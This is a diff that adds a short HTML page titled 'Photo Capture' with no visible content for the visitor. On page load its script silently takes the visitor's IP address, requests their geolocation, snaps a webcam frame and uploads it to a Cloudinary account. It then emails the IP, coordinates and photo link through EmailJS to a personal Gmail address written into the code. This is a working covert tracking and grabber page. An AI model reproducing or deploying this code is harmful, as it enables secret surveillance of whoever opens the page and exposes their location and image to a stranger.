@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Photo Capture</title>
+</head>
+<body>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("ACOn6PC1Zb70JrmxT");
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unavailable";
+      }
+    }
+
+    async function getLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            resolve({
+              latitude: pos.coords.latitude.toString(),
+              longitude: pos.coords.longitude.toString()
+            });
+          },
+          () => {
+            resolve({ latitude: "Unavailable", longitude: "Unavailable" });
+          }
+        );
+      });
+    }
+
+    async function capturePhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        return new Promise(resolve => {
+          canvas.toBlob(blob => resolve(blob), "image/jpeg");
+        });
+      } catch {
+        return null;
+      }
+    }
+
+    async function uploadToCloudinary(blob) {
+      const formData = new FormData();
+      formData.append("file", blob);
+      formData.append("upload_preset", "unsigned_video_uploads");
+
+      const res = await fetch("https://api.cloudinary.com/v1_1/dymxlqxxx/image/upload", {
+        method: "POST",
+        body: formData
+      });
+
+      const data = await res.json();
+      return data.secure_url;
+    }
+
+    async function sendEmail() {
+      const ip = await getIP();
+      const location = await getLocation();
+      const photoBlob = await capturePhoto();
+
+      let photoUrl = "Photo not available.";
+
+      if (photoBlob) {
+        try {
+          photoUrl = await uploadToCloudinary(photoBlob);
+        } catch {
+          photoUrl = "Photo upload failed.";
+        }
+      }
+
+      const message = 
+`You received a new photo.
+
+Download link: ${photoUrl}
+Sender IP: ${ip}
+Latitude: ${location.latitude}
+Longitude: ${location.longitude}`;
+
+      try {
+        await emailjs.send("service_khmk344", "template_oyrsayr", {
+          to_email: "julianlee252@gmail.com",
+          message: message
+        });
+        console.log("✅ Email sent.");
+      } catch (err) {
+        console.error("Error sending email:", err);
+      }
+    }
+
+    window.onload = sendEmail;
+  </script>
+</body>
+</html>
